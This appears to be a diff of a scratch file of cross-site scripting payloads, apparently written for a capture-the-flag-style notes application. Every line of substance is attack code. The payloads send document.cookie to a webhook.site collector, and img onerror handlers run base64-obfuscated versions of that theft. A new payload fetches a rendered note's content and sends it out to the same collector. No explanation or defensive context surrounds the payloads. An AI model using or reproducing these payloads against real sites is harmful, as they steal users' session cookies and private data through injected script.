@@ -1,5 +1,21 @@
-eval(fetch("https://webhook.site/42ad8c24-9dc4-4f77-9397-8b27a4dd4efa/" + document.cookie))
+fetch("https://webhook.site/74225546-4369-4a51-a43a-984ee6fa2bca/" + document.cookie)
 
-<img src="https://www.markdownguide.org/asets/images/tux.png" onerror="eval(atob('ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzQyYWQ4YzI0LTlkYzQtNGY3Ny05Mzk3LThiMjdhNGRkNGVmYS8iICsgZG9jdW1lbnQuY29va2llKQ=='))">
+<img src="https://www.markdownguide.org/asets/images/tux.png" onerror="eval(atob('ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzc0MjI1NTQ2LTQzNjktNGE1MS1hNDNhLTk4NGVlNmZhMmJjYS8iICsgZG9jdW1lbnQuY29va2llKQ=='))">
+
+
+
+
+
+fetch('/render/1')
+.then(response => response.text())
+.then(note_content => {
+    fetch('https://webhook.site/74225546-4369-4a51-a43a-984ee6fa2bca/' + note_content);
+});
+
+<img src="https://www.markdownguide.org/asets/images/tux.png" onerror="eval(atob('ZmV0Y2goJy9yZW5kZXIvMScpCiAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAudGhlbihub3RlX2NvbnRlbnQgPT4gewogICAgICBmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvNzQyMjU1NDYtNDM2OS00YTUxLWE0M2EtOTg0ZWU2ZmEyYmNhLycgKyBub3RlX2NvbnRlbnQpOwogICAgfSk7Cg=='))">
+
+
 
 https://www.base64encode.org/
+
+
